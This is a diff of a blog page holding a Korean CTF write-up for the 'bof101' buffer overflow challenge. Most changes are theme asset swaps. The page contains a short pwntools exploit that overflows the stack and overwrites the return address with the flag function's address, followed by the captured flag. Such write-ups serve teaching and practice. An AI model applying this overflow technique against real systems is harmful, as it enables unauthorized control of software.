@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -409,7 +409,32 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다.</p>
 <p>32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만,</p>
 <p>64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"> <span class="hljs-number">1</span> <span class="hljs-comment">#!/usr/bin/python3</span><br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">4</span> <br> <span class="hljs-number">5</span> <span class="hljs-comment">#p = process(&#x27;./bof101&#x27;)</span><br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> p = remote(<span class="hljs-string">&#x27;bof101.sstf.site&#x27;</span>,<span class="hljs-number">1337</span>)<br> <span class="hljs-number">8</span> <br> <span class="hljs-number">9</span> e = ELF(<span class="hljs-string">&#x27;./bof101&#x27;</span>)<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> p.recvuntil(<span class="hljs-string">&#x27;addr:&#x27;</span>)<br><span class="hljs-number">12</span> <br><span class="hljs-number">13</span> flag_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">15</span>),<span class="hljs-number">16</span>)<br><span class="hljs-number">14</span> <br><span class="hljs-number">15</span> p.recvline()<br><span class="hljs-number">16</span> <br><span class="hljs-number">17</span> print(<span class="hljs-built_in">hex</span>(flag_addr))<br><span class="hljs-number">18</span> <br><span class="hljs-number">19</span> payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">140</span><br><span class="hljs-number">20</span> payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br><span class="hljs-number">21</span> payload += <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">8</span><br><span class="hljs-number">22</span> payload += p64(flag_addr)<br><span class="hljs-number">23</span> <br><span class="hljs-number">24</span> p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><span class="hljs-number">25</span> <br><span class="hljs-number">26</span> p.interactive()<br></code></pre></td></tr></table></figure>
+<pre><code class="py"> 1 #!/usr/bin/python3
+ 2 
+ 3 from pwn import *
+ 4 
+ 5 #p = process(&#39;./bof101&#39;)
+ 6 
+ 7 p = remote(&#39;bof101.sstf.site&#39;,1337)
+ 8 
+ 9 e = ELF(&#39;./bof101&#39;)
+10 
+11 p.recvuntil(&#39;addr:&#39;)
+12 
+13 flag_addr = int(p.recv(15),16)
+14 
+15 p.recvline()
+16 
+17 print(hex(flag_addr))
+18 
+19 payload = &quot;A&quot;*140
+20 payload += p32(0xdeadbeef)
+21 payload += &quot;A&quot;*8
+22 payload += p64(flag_addr)
+23 
+24 p.sendlineafter(&#39;: &#39;,payload)
+25 
+26 p.interactive()</code></pre>
 <p><code> SCTF&#123;n0w_U_R_B0F_3xpEr7&#125; </code></p>
 
   
@@ -424,7 +449,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
       
       
       
@@ -682,7 +707,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -761,7 +786,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -879,29 +904,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1003,7 +1005,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1015,7 +1017,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
